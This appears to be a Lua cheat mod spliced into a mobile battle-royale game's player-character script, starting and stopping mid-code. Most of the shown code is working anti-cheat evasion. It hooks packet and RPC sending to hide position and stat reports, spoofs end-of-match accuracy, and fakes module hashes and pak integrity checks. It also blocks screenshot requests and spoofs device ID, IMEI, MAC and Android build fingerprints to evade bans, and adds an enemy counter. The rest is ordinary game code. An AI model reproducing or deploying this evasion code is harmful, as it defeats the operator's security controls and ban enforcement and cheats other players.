                        X = DamageEvent.HitInfo.Location.X + (math.random()-0.5)*2,
                        Y = DamageEvent.HitInfo.Location.Y + (math.random()-0.5)*2,
                        Z = DamageEvent.HitInfo.Location.Z + (math.random()-0.5)*2
                    }
                end
                return origTakeDamage(self, DamageAmount, DamageEvent, EventInstigator, DamageCauser)
            end
        end
    end)

    ---------- RADAR HACK DETECTION ----------
    pcall(function()
        if NetUtil and NetUtil.SendPacket then
            local orig = NetUtil.SendPacket
            NetUtil.SendPacket = function(pname, ...)
                if isBypassActive() and pname then
                    local p = tostring(pname):lower()
                    if p:match("position") or p:match("location") or p:match("coord") or
                       p:match("playerpos") or p:match("move") or p:match("teleport") then
                        return nil
                    end
                end
                return orig(pname, ...)
            end
        end
        if _G.SendRPC then
            local orig = _G.SendRPC
            _G.SendRPC = function(rpcName, ...)
                if isBypassActive() and rpcName then
                    local r = tostring(rpcName):lower()
                    if r:match("position") or r:match("location") or r:match("coord") then
                        return
                    end
                end
                return orig(rpcName, ...)
            end
        end
    end)

    ---------- BEHAVIOR ANALYSIS (End-of-Match Stats Spoof) ----------
    local matchStats = { totalShots = 0, totalHits = 0, headshots = 0, kills = 0 }
    pcall(function()
        local Weapon = import("ShootWeaponEntity") or import("ShootWeaponEntityComp")
        if Weapon and Weapon.Fire then
            local origFire = Weapon.Fire
            Weapon.Fire = function(self, ...)
                if isBypassActive() then matchStats.totalShots = matchStats.totalShots + 1 end
                return origFire(self, ...)
            end
        end
        local Actor = import("Actor")
        if Actor and Actor.TakeDamage then
            local origTakeDamage2 = Actor.TakeDamage
            Actor.TakeDamage = function(self, DamageAmount, DamageEvent, EventInstigator, DamageCauser)
                if isBypassActive() and EventInstigator == slua_GameFrontendHUD:GetPlayerController() then
                    matchStats.totalHits = matchStats.totalHits + 1
                    if DamageEvent and DamageEvent.HitInfo and DamageEvent.HitInfo.BoneName and
                       tostring(DamageEvent.HitInfo.BoneName):find("head") then
                        matchStats.headshots = matchStats.headshots + 1
                    end
                    if self:IsDead() then matchStats.kills = matchStats.kills + 1 end
                end
                return origTakeDamage2(self, DamageAmount, DamageEvent, EventInstigator, DamageCauser)
            end
        end
        -- Spoof final stats report
        local GameReportUtils = package.loaded["GameLua.Mod.BaseMod.GamePlay.GameReport.GameReportUtils"]
        if GameReportUtils and GameReportUtils.ReportGameResult then
            local origReport = GameReportUtils.ReportGameResult
            GameReportUtils.ReportGameResult = function(self, data)
                if isBypassActive() and data then
                    local shots = math.max(matchStats.totalShots, 1)
                    data.accuracy = math.min(0.65, 0.35 + math.random()*0.15)
                    data.headshotRate = math.min(0.30, 0.10 + math.random()*0.10)
                    data.totalKills = matchStats.kills
                    data.totalShots = shots
                    data.totalHits = math.floor(shots * data.accuracy)
                end
                return origReport(self, data)
            end
        end
        local ShowResult = package.loaded["GameLua.Mod.BaseMod.Client.BattleResult.ProcessBase.BattleResultShowResultLogic"]
        if ShowResult and ShowResult.ReceiveData then
            local origReceive = ShowResult.ReceiveData
            ShowResult.ReceiveData = function(self, resultData)
                if isBypassActive() and resultData then
                    resultData.Accuracy = math.random(35,50)/100
                    resultData.HeadShotRate = math.random(10,20)/100
                end
                return origReceive(self, resultData)
            end
        end
    end)

    ---------- DLL / CODE INTEGRITY ----------
    pcall(function()
        if rawget(_G, "IsDebuggerPresent") then _G.IsDebuggerPresent = retFalse end
        if _G.TssSdk then
            _G.TssSdk.GetModuleHash = function() return "82918E1FE1BE4186CFD2F1286951B2A0" end
            _G.TssSdk.VerifyModule = retTrue
            _G.TssSdk.ScanProcess = retEmpty
        end
        local FMemory = import("FMemory")
        if FMemory and FMemory.Memcpy then
            local origMemcpy = FMemory.Memcpy
            FMemory.Memcpy = function(dest, src, count)
                if isBypassActive() then return end
                return origMemcpy(dest, src, count)
            end
        end
    end)

    ---------- PAK SIZE DETECTION ----------
    pcall(function()
        local FileHelper = import("FFileHelper")
        if FileHelper then
            if FileHelper.GetFileSize then
                local orig = FileHelper.GetFileSize
                FileHelper.GetFileSize = function(path)
                    local size = orig(path)
                    if isBypassActive() and path and tostring(path):lower():match(".pak") then
                        return 2000000000
                    end
                    return size
                end
            end
            if FileHelper.SaveStringToFile then
                local origSave = FileHelper.SaveStringToFile
                FileHelper.SaveStringToFile = function(str, path, ...)
                    if isBypassActive() and path and tostring(path):lower():match(".pak") then
                        return true
                    end
                    return origSave(str, path, ...)
                end
            end
        end
        local PakSubsystem = pcall(require, "GameLua.GameCore.Module.Subsystem.PakFileSubsystem") and require("GameLua.GameCore.Module.Subsystem.PakFileSubsystem")
        if PakSubsystem then
            PakSubsystem.CheckPakIntegrity = nop
            PakSubsystem.ReportPakMismatch = nop
        end
    end)

    ---------- SPEED HACK DETECTION ----------
    pcall(function()
        local CharacterMovement = import("CharacterMovementComponent")
        if CharacterMovement then
            local origGetMaxSpeed = CharacterMovement.GetMaxSpeed
            CharacterMovement.GetMaxSpeed = function(self)
                local speed = origGetMaxSpeed(self)
                if isBypassActive() then return 600.0 end
                return speed
            end
            local origGetMaxAcceleration = CharacterMovement.GetMaxAcceleration
            CharacterMovement.GetMaxAcceleration = function(self)
                local acc = origGetMaxAcceleration(self)
                if isBypassActive() then return 2048.0 end
                return acc
            end
        end
    end)

    ---------- EXTRA SHIELD: Shader, Pak Entries, Real-time Stats, Screenshot ----------
    pcall(function()
        -- Shader map hiding
        local UMat = import("Material")
        local UMatInst = import("MaterialInstance")
        if UMat then
            UMat.GetShaderMap = function(self) return nil end
            UMat.GetShaderPlatform = function(self) return 0 end
        end
        if UMatInst then
            UMatInst.GetShaderMap = function(self) return nil end
        end
        -- Pak entry scanner block
        local FPakFile = import("FPakFile") or import("FPakPlatformFile")
        if FPakFile then
            FPakFile.GetPakEntries = function(...) return {} end
            FPakFile.GetPakFolders = function(...) return {} end
            FPakFile.FindFileInPakFiles = function(...) return false end
        end
        -- Real-time stat blocking
        if NetUtil and NetUtil.SendPacket then
            local orig = NetUtil.SendPacket
            NetUtil.SendPacket = function(pname, ...)
                if isBypassActive() and pname and tostring(pname):lower():match("stat") then return nil end
                return orig(pname, ...)
            end
        end
        -- Screenshot manager block
        local SSMgr = import("ScreenshotManager")
        if SSMgr then
            SSMgr.RequestScreenshot = function(...) return false end
            SSMgr.HasPendingScreenshot = function(...) return false end
        end
    end)

    _G.__ADVANCED_BYPASS_LOADED = true
    print("✅ Advanced Detection Bypass (Magic, Radar, Behavior, DLL, Pak, Speed, Extra Shield) Installed")
end

InstallAdvancedDetectionBypass()

-- ========================================================================
-- ⚡ DEVICE ID / BAN BYPASS (Cleans banned device fingerprint)
-- ========================================================================
local function InstallDeviceBanBypass()
    if _G.__DEVICE_BAN_BYPASS_LOADED then return end

    local nop = function() end
    local function isBypassActive()
        return _G._WHA_BYPASS_ACTIVE and not _G._MOD_EXPIRED
    end

    -- Generate random but consistent fake IDs (same for session)
    local function generateFakeId(length)
        local chars = "0123456789ABCDEF"
        local id = ""
        for i = 1, length do
            id = id .. chars:sub(math.random(1, #chars), math.random(1, #chars))
        end
        return id
    end
    local fakeDeviceID = generateFakeId(32)
    local fakeAndroidID = generateFakeId(16)
    local fakeMac = string.format("%02X:%02X:%02X:%02X:%02X:%02X",
        math.random(0,255), math.random(0,255), math.random(0,255),
        math.random(0,255), math.random(0,255), math.random(0,255))
    local fakeIMEI = "35" .. math.random(100000, 999999) .. math.random(100000, 999999)

    -- Hook SystemInfo functions
    pcall(function()
        local SystemInfo = import("SystemInfo")
        if SystemInfo then
            if SystemInfo.GetDeviceID or SystemInfo.GetUniqueDeviceId then
                local orig = SystemInfo.GetDeviceID or SystemInfo.GetUniqueDeviceId
                if orig then
                    if SystemInfo.GetDeviceID then
                        SystemInfo.GetDeviceID = function()
                            if isBypassActive() then return fakeDeviceID end
                            return orig()
                        end
                    end
                    if SystemInfo.GetUniqueDeviceId then
                        SystemInfo.GetUniqueDeviceId = function()
                            if isBypassActive() then return fakeDeviceID end
                            return orig()
                        end
                    end
                end
            end
            if SystemInfo.GetMacAddress then
                local orig = SystemInfo.GetMacAddress
                SystemInfo.GetMacAddress = function()
                    if isBypassActive() then return fakeMac end
                    return orig()
                end
            end
            if SystemInfo.GetAndroidId then
                local orig = SystemInfo.GetAndroidId
                SystemInfo.GetAndroidId = function()
                    if isBypassActive() then return fakeAndroidID end
                    return orig()
                end
            end
            if SystemInfo.GetIMEI then
                local orig = SystemInfo.GetIMEI
                SystemInfo.GetIMEI = function()
                    if isBypassActive() then return fakeIMEI end
                    return orig()
                end
            end
            -- General device name
            if SystemInfo.GetDeviceName then
                local orig = SystemInfo.GetDeviceName
                SystemInfo.GetDeviceName = function()
                    if isBypassActive() then return "Galaxy S21 Ultra 5G" end
                    return orig()
                end
            end
        end
    end)

    -- Hook Build class for Android specific properties
    pcall(function()
        local Build = import("Build")
        if Build then
            -- Build.Fingerprint, Serial, Hardware, Brand, etc.
            local props = {
                "Fingerprint", "Serial", "Hardware", "Brand", "Model", "Manufacturer", "Product", "Device", "Board"
            }
            for _, prop in ipairs(props) do
                local orig = Build[prop]
                if orig then
                    Build[prop] = function()
                        if isBypassActive() then
                            if prop == "Fingerprint" then return "google/oriole/oriole:13/TQ1A.221205.011/2022120500:user/release-keys" end
                            if prop == "Serial" then return "R5CT1234567" end
                            if prop == "Hardware" then return "oriole" end
                            if prop == "Brand" then return "google" end
                            if prop == "Model" then return "Pixel 6" end
                            if prop == "Manufacturer" then return "Google" end
                            if prop == "Product" then return "oriole" end
                            if prop == "Device" then return "oriole" end
                            if prop == "Board" then return "gs101" end
                        end
                        return orig()
                    end
                end
            end
            -- Build.VERSION.SDK_INT etc.
            if Build.VERSION and Build.VERSION.SDK_INT then
                local orig = Build.VERSION.SDK_INT
                Build.VERSION.SDK_INT = function()
                    if isBypassActive() then return 33 end
                    return orig()
                end
            end
        end
    end)

    -- Hook TssSdk device info functions
    pcall(function()
        local TssSdk = _G.TssSdk
        if TssSdk then
            if TssSdk.GetDeviceInfo then
                local orig = TssSdk.GetDeviceInfo
                TssSdk.GetDeviceInfo = function()
                    if not isBypassActive() then return orig() end
                    return {
                        deviceId = fakeDeviceID,
                        androidId = fakeAndroidID,
                        mac = fakeMac,
                        imei = fakeIMEI,
                        model = "Pixel 6",
                        brand = "google",
                        sdkInt = 33,
                        fingerprint = "google/oriole/oriole:13/TQ1A.221205.011/2022120500:user/release-keys"
                    }
                end
            end
            if TssSdk.GetFingerprint then
                local orig = TssSdk.GetFingerprint
                TssSdk.GetFingerprint = function()
                    if isBypassActive() then return "google/oriole/oriole:13/TQ1A.221205.011/2022120500:user/release-keys" end
                    return orig()
                end
            end
            if TssSdk.GetClientID then
                local orig = TssSdk.GetClientID
                TssSdk.GetClientID = function()
                    if isBypassActive() then return fakeDeviceID end
                    return orig()
                end
            end
        end
    end)

    -- Override any global device ID variables
    pcall(function()
        if _G.DeviceID then _G.DeviceID = fakeDeviceID end
        if _G.AndroidID then _G.AndroidID = fakeAndroidID end
        if _G.MacAddress then _G.MacAddress = fakeMac end
        if _G.IMEI then _G.IMEI = fakeIMEI end
    end)

    _G.__DEVICE_BAN_BYPASS_LOADED = true
    print("✅ Device ID / Ban Bypass Installed (Cleaned device identity)")
end

InstallDeviceBanBypass()

-- ========================================================================
-- ⚡ ENEMY COUNTER (Distance-based enemy detection with bot/real breakdown)
-- ========================================================================
_G.ENEMY_COUNTER_TIMER = nil

function _G.EnemyCounterLoop()
    if _G.AK_GetVal("ENEMY_COUNTER") ~= 1 then return end

    local player = GameplayData and GameplayData.GetPlayerCharacter()
    if not slua.isValid(player) then return end

    local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
    if not slua.isValid(pc) then return end

    local hud = pc:GetHUD()
    if not slua.isValid(hud) then return end

    local myTeamId = player.TeamID or 0
    local myPos = player:K2_GetActorLocation()
    if not myPos then return end

    local totalEnemies = 0
    local botCount = 0
    local realCount = 0
    local MAX_DIST_SQ = 900000000  -- 30000 units radius (~300m)

    local allPawns = Game:GetAllPlayerPawns() or {}
    for _, pawn in pairs(allPawns) do
        if slua.isValid(pawn) and pawn ~= player then
            local pawnTeam = pawn.TeamID or 0
            if pawnTeam ~= myTeamId then
                local pos = pawn:K2_GetActorLocation()
                if pos then
                    local dx = pos.X - myPos.X
                    local dy = pos.Y - myPos.Y
                    local dz = pos.Z - myPos.Z
                    if dx*dx + dy*dy + dz*dz <= MAX_DIST_SQ then
                        totalEnemies = totalEnemies + 1
                        local isBot = false
                        pcall(function()
                            isBot = Game:IsAI(pawn)
                        end)
                        if isBot then
                            botCount = botCount + 1
                        else
                            realCount = realCount + 1
                        end
                    end
                end
            end
        end
    end

    local text = ""
    local COLOR_SAFE  = { R = 0,   G = 255, B = 0,   A = 255 }  -- GREEN for safe
    local COLOR_ENEMY = { R = 255, G = 215, B = 0,   A = 255 }  -- YELLOW for enemies
    local color = COLOR_SAFE

    if totalEnemies == 0 then
        text = "SAFE - AREA CLEAR"
        color = COLOR_SAFE
    else
        text = string.format("ENEMIES : %d  ||  BOT : %d  |  REAL : %d", totalEnemies, botCount, realCount)
        color = COLOR_ENEMY
    end

    if text ~= "" then
        local OFFSET = { X = 0, Y = 0, Z = 35 }
        hud:AddDebugText(text, player, 1.0, OFFSET, OFFSET, color, true, false, true, nil, 1.5, true)
    end
end

function _G.StartEnemyCounter()
    if _G.ENEMY_COUNTER_TIMER then
        pcall(function()
            if _G.Game then _G.Game:RemoveGameTimer(_G.ENEMY_COUNTER_TIMER) end
        end)
        _G.ENEMY_COUNTER_TIMER = nil
    end
    if _G.AK_GetVal("ENEMY_COUNTER") ~= 1 then return false end
    local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
    if slua.isValid(pc) and pc.AddGameTimer then
        _G.ENEMY_COUNTER_TIMER = pc:AddGameTimer(1.0, true, function()
            pcall(_G.EnemyCounterLoop)
        end)
        print("[ENEMY COUNTER] ✅ Started")
        return true
    end
    return false
end

function _G.StopEnemyCounter()
    if _G.ENEMY_COUNTER_TIMER then
        pcall(function()
            if _G.Game then _G.Game:RemoveGameTimer(_G.ENEMY_COUNTER_TIMER) end
        end)
        _G.ENEMY_COUNTER_TIMER = nil
        print("[ENEMY COUNTER] Stopped")
    end
end

-- ============================================================================
-- MERGED BYPASS v3.0
-- ============================================================================
BRPlayerCharacterBase.ServerRPC.RPC_Server_ReportSimulateCharacterLocation = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ClientRPC.RPC_Client_ShootVertifyRes = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ClientRPC.RPC_ClientCoronaLab = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ServerRPC.RPC_Server_ReportPlayerKillFlow = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ServerRPC.RPC_Server_ClientSecMrpcsFlow = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ServerRPC.RPC_Server_Heartbeat = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ServerRPC.RPC_Server_SwiftHawk = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ServerRPC.RPC_Server_ClientSwiftHawkWithParams = { Reliable = true, Params = {} }
local ENetRole = import("ENetRole")
local EPawnState = import("EPawnState")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")

function BRPlayerCharacterBase:ctor()
end

function BRPlayerCharacterBase:_PostConstruct()
  BRPlayerCharacterBase.__super._PostConstruct(self)
  self:InitAddSpecialMoveInfo()
  self.bCanNearDeathGiveup = true
  print(bWriteLog and "BRPlayerCharacterBase:_PostConstruct bCanNearDeathGiveup true")
end

function BRPlayerCharacterBase:ReceiveBeginPlay()
  BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
  self:AddControlEvent(self, "MovementModeChangedDelegate", self.HandleOnMovementModeChangedNew, self)
  if self:HasAuthority() and self:CheckAddCheckFallingDistanceComponent() then
    local CheckFallingDistanceComponent_C = import("CheckFallingDistanceComponent")
    if slua.isValid(CheckFallingDistanceComponent_C) and not slua.isValid(self:GetComponentByClass(CheckFallingDistanceComponent_C)) then
      print(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay Add CheckFallingDistanceComponent")
      Game:AddComponent(CheckFallingDistanceComponent_C, self, "CheckFallingDistanceComponent")
    end
  end
  if slua.isValid(self.STCharacterMovement) then
    self.STCharacterMovement.bPositiveBlowUp = true
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy then
    self:AddControlEvent(self, "OnPawnStateDisabled", self.OnPawnStateChange, self)
    self:AddControlEvent(self, "OnPawnStateEnabled", self.OnPawnStateChange, self)
    self:AddControlEventConditionOnly(self, "OnAttrChangeEventDelegate", {
      AttrName = {
        "bCanSelfRescue"
      }
    }, self.CharacterAttrChangeEvent, self)
  end
  if Client then
    printf(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay, PlayerKey:%u ", self.PlayerKey)
    GameplayData.AddCharacter(self.Object)
    self:AddControlEvent(self, "OnAttachedToVehicle", self.HandleOnAttachedToVehicle, self)
    self:AddControlEvent(self, "OnDetachedFromVehicle", self.HandleOnDetachedFromVehicle, self)
  else
    self:AddCommonEventWithConditions(EVENTTYPE_INGAME_NORMAL, EVENTID_GAME_MODE_STATE_CHANGE, {
      [1] = "FinishedState"
    }, self.HandleFinishedState, self)
  end
end

function BRPlayerCharacterBase:HandleOnAttachedToVehicle(uVehicle)
  if not slua.isValid(uVehicle) then
    return
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:HandleOnAttachedToVehicle", Game:GetObjName(uVehicle)))
  if self.Role == ENetRole.ROLE_SimulatedProxy then
    self:ClearAttachToVehicleTimer()
    self.nUpdatePlayerAttachToVehicleCount = 0
    local function _put_updAttachVeh()
      if slua.isValid(self.Object) and slua.isValid(uVehicle) then
        self:UpdatePlayerAttachToVehicle(uVehicle)
      end
    end
    local function _put_fixMeshCont()
      if slua.isValid(self.Object) and slua.isValid(uVehicle) then
        self:FixMeshContainerOffsetIfNeeded(uVehicle)
      end
    end
    self.nUpdatePlayerAttachToVehicleTimer = self:AddGameTimer(5, true, _put_updAttachVeh)
    self.nFixMeshContainerTimer = self:AddGameTimer(3, true, _put_fixMeshCont)
  end
end

function BRPlayerCharacterBase:HandleOnDetachedFromVehicle(uLastVehicle)
  if not slua.isValid(uLastVehicle) then
    return
  end
  print(bWriteLog and "BRPlayerCharacterBase:HandleOnDetachedFromVehicle", uLastVehicle)
  if self.Role == ENetRole.ROLE_SimulatedProxy then
    self:ClearAttachToVehicleTimer()
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
end

function BRPlayerCharacterBase:UpdatePlayerAttachToVehicle(uVehicle)
  if not slua.isValid(self.Object) or not slua.isValid(uVehicle) then
    return
  end
  if not slua.isValid(self.CapsuleComponent) or not slua.isValid(self.Mesh) or not slua.isValid(self.MeshContainer) then
    return
  end
  if not slua.isValid(self:GetCurrentVehicle()) then
    return
  end
  if Game:IsDriver(self.Object) then
    return
  end
  if not self.nUpdatePlayerAttachToVehicleCount then
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
  local ESTEPoseState = import("ESTEPoseState")
  local bStand = self.PoseState == ESTEPoseState.Stand
  local uActorRelativeLocation = self.CapsuleComponent:GetRelativeTransform():GetLocation()
  local uMeshRelativeLocation = self.Mesh:GetRelativeTransform():GetLocation()
  local uMeshContainerRelativeLocationZ = self.MeshContainer:GetRelativeTransform():GetLocation().Z
  local nCapsuleRadius = self.CapsuleComponent:GetScaledCapsuleRadius()
  local nCapsuleHalfHeight = self.CapsuleComponent:GetScaledCapsuleHalfHeight()
  local uMeshContainerExpectedZ = -1 * self.StandHalfHeight
  local nExpectedCapsuleRadius = self.StandRadius
  local nExpectedCapsuleHalfHeight = self.StandHalfHeight
  local uMeshExpectedRL = FVector(0, 0, 0)
  local uActorExpectedRL = FVector(0, 0, self.StandHalfHeight)
  local nTolerance = 1.0
  local bCapsuleRLCorrect = uActorRelativeLocation:Equals(uActorExpectedRL, nTolerance)
  local bMeshRLCorrect = uMeshRelativeLocation:Equals(uMeshExpectedRL, nTolerance)
  local bMeshContainerRLCorrect = nTolerance > math.abs(uMeshContainerRelativeLocationZ - uMeshContainerExpectedZ)
  local bCapsuleRadiusCorrect = nTolerance > math.abs(nCapsuleRadius - nExpectedCapsuleRadius)
  local bCapsuleHalfHeightCorrect = nTolerance > math.abs(nCapsuleHalfHeight - nExpectedCapsuleHalfHeight)
  local bAllCorrect = bStand and bCapsuleRLCorrect and bMeshRLCorrect and bMeshContainerRLCorrect and bCapsuleRadiusCorrect and bCapsuleHalfHeightCorrect
  if not bAllCorrect then
    self.nUpdatePlayerAttachToVehicleCount = self.nUpdatePlayerAttachToVehicleCount + 1
  else
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:UpdatePlayerAttachToVehicle PlayerKey:%s. bAllCorrect=%s Check Result:%d %d %d %d %d %d, Count:%d", tostring(self.PlayerKey), tostring(bAllCorrect), bStand and 1 or 0, bCapsuleRLCorrect and 1 or 0, bMeshRLCorrect and 1 or 0, bMeshContainerRLCorrect and 1 or 0, bCapsuleRadiusCorrect and 1 or 0, bCapsuleHalfHeightCorrect and 1 or 0, self.nUpdatePlayerAttachToVehicleCount))
  if self.nUpdatePlayerAttachToVehicleCount >= 3 and not bAllCorrect then
    local GameplayData = require("GameLua.GameCore.Data.GameplayData")
    local uPlayerController = GameplayData.GetPlayerController()
    if uPlayerController.ReportCrashKitFeature and uPlayerController.ReportCrashKitFeature.ReportCharacterAttachedOnVehicleException then
      local sReportInfo = string.format("VehicleShapeType:%s PlayerKey:%s. Check Result:%d %d %d %d %d %d. Capsule.RelativeLoc:%s Capsule.Radius:%s Capsule.HalfHeight:%s Mesh.RelativeLoc:%s MeshContainer.RelativeLocZ:%s", tostring(uVehicle.VehicleShapeType), tostring(self.PlayerKey), bStand and 1 or 0, bCapsuleRLCorrect and 1 or 0, bMeshRLCorrect and 1 or 0, bMeshContainerRLCorrect and 1 or 0, bCapsuleRadiusCorrect and 1 or 0, bCapsuleHalfHeightCorrect and 1 or 0, uActorRelativeLocation:ToString(), tostring(nCapsuleRadius), tostring(nCapsuleHalfHeight), uMeshRelativeLocation:ToString(), tostring(uMeshContainerRelativeLocationZ))
      uPlayerController.ReportCrashKitFeature:ReportCharacterAttachedOnVehicleException(sReportInfo)
    end
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
end

function BRPlayerCharacterBase:FixMeshContainerOffsetIfNeeded(uVehicle)
  if not slua.isValid(self.Object) or not slua.isValid(uVehicle) then
    return
  end
  if not slua.isValid(self.MeshContainer) then
    return
  end
  if not slua.isValid(self:GetCurrentVehicle()) then
    return
  end
  if Game:IsDriver(self.Object) then
    return
  end
  local nTolerance = 1.0
  local uMeshContainerExpectedZ = -1 * self.StandHalfHeight
  local uMeshContainerRelativeLocationZ = self.MeshContainer:GetRelativeTransform():GetLocation().Z
  if nTolerance <= math.abs(uMeshContainerRelativeLocationZ - uMeshContainerExpectedZ) then
    print(bWriteLog and string.format("BRPlayerCharacterBase:FixMeshContainerOffsetIfNeeded PlayerKey:%s. SetMeshContainerOffsetZ from:%s to:%s", tostring(uMeshContainerExpectedZ), tostring(uMeshContainerExpectedZ)))
    self:SetMeshContainerOffsetZ(uMeshContainerExpectedZ)
  end
end

function BRPlayerCharacterBase:ClearAttachToVehicleTimer()
  if self.nUpdatePlayerAttachToVehicleTimer then
    self:RemoveGameTimer(self.nUpdatePlayerAttachToVehicleTimer)
    self.nUpdatePlayerAttachToVehicleTimer = nil
  end
  if self.nFixMeshContainerTimer then
    self:RemoveGameTimer(self.nFixMeshContainerTimer)
    self.nFixMeshContainerTimer = nil
  end
end

function BRPlayerCharacterBase:CharacterAttrChangeEvent(uPawn, AttrName, AttrVal)
  BRPlayerCharacterBase.__super.CharacterAttrChangeEvent(self, uPawn, AttrName, AttrVal)
  if self.Object ~= uPawn then
    return
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and AttrName == "bCanSelfRescue" then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_CanSelfRescue", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:OnPawnStateChange(PawnState)
  print("BRPlayerCharacterBase:OnPawnStateChange:", PawnState)
  local EPawnState = import("EPawnState")
  if PawnState == EPawnState.SwitchPP then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_FPPModeChange", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:HandleFinishedState()
  print(bWriteLog and "BRPlayerCharacterBase:HandleFinishedState", self.STCharacterMovement)
  if slua.isValid(self.STCharacterMovement) and self.STCharacterMovement.SetDynamicSimpleQueryConfig then
    self.STCharacterMovement:SetDynamicSimpleQueryConfig(false)
  end
end

function BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent()
  if CGameMode and CGameMode.GameModeType and CGameState and CGameState.GameModeID then
    local EGameModeType = import("EGameModeType")
    local MatchModeIds = require("GameLua.Mod.BaseMod.GamePlay.Config.MatchModeIdsConfig")
    local GameModeType = CGameMode.GameModeType
    local GameModeID = tonumber(CGameState.GameModeID)
    local bModeTypeSatisfy = GameModeType == EGameModeType.ETypicalGameMode or GameModeType == EGameModeType.EFourInOneGameMode or GameModeType == EGameModeType.EHeavyWeaponGameMode
    local bModeIDSatisfy = not MatchModeIds[GameModeID]
    print(bWriteLog and bWriteLog and "BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent:", GameModeType, GameModeID, bModeTypeSatisfy, bModeIDSatisfy)
    return bModeTypeSatisfy and bModeIDSatisfy
  end
  return false
end

function BRPlayerCharacterBase:LuaHandleParachuteStateChanged(LastParachuteState, NewParachuteState)
  BRPlayerCharacterBase.__super.LuaHandleParachuteStateChanged(self, LastParachuteState, NewParachuteState)
  local EParachuteState = import("EParachuteState")
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if NewParachuteState == EParachuteState.PS_Opening then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.SatrtCheckShowParachuteCloseUI then
          uCurrentPlayerControl.CheckParachuteOpenFeature:SatrtCheckShowParachuteCloseUI()
        end
      elseif NewParachuteState == EParachuteState.PS_None then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.RecoverParachuteOpenParam then
          uCurrentPlayerControl.CheckParachuteOpenFeature:RecoverParachuteOpenParam()
        end
        if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
          uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
        end
      end
    end
  end
end

function BRPlayerCharacterBase:OnLanded()
  printf("BRPlayerCharacterBase:OnLanded PlayerKey:%d", self.PlayerKey)
  if self.HandleOnLanded then
    self:HandleOnLanded(-1)
  end
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
      end
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ResetCheckShowUI then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ResetCheckShowUI()
      end
    end
  end
end

function BRPlayerCharacterBase:ReceiveEndPlay(EndPlayReason)
  BRPlayerCharacterBase.__super.ReceiveEndPlay(self, EndPlayReason)
  if Client then
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:IsWarGameMode()
  local GameplayData = require("GameLua.GameCore.Data.GameplayData")
  local uGameState = GameplayData:GetGameState()
  local STExtraGameStateBase = import("STExtraGameStateBase")
  if slua.isValid(uGameState) and Game:IsClassOf(uGameState, STExtraGameStateBase) then
    local EGameModeType = import("EGameModeType")
    return uGameState.GameModeType == EGameModeType.EWarGameMode
  else
    return false
  end
end

function BRPlayerCharacterBase:BPOnRecycled()
  print(bWriteLog and string.format("%s BPOnRecycled()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:BPOnRespawned()
  print(bWriteLog and string.format("%s BPOnRespawned()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:ReceiveOnRecycle()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnRecycle()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ReceiveOnSpawn()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnSpawn()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.AddCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ResetMeshRelativeLocationAndRotation()
  if Game:IsValid(self.Object) and Game:IsValid(self.Mesh) then
    local uDefaultMeshRot = FRotator(0, -90, 0)
    local uDefaultMeshRelativeLoc = FVector(0, 0, 0)
    if self.Mesh.K2_SetRelativeRotation then
      self.Mesh:K2_SetRelativeRotation(uDefaultMeshRot, false, nil, false)
    end
    self:CacheInitialMeshOffset(uDefaultMeshRelativeLoc, uDefaultMeshRot)
    local vRelativeRot = self.Mesh.RelativeRotation
    local vBaseRotationOffset = self.BaseRotationOffset
    local vBaseRotation = Game:QuatToRotator(vBaseRotationOffset)
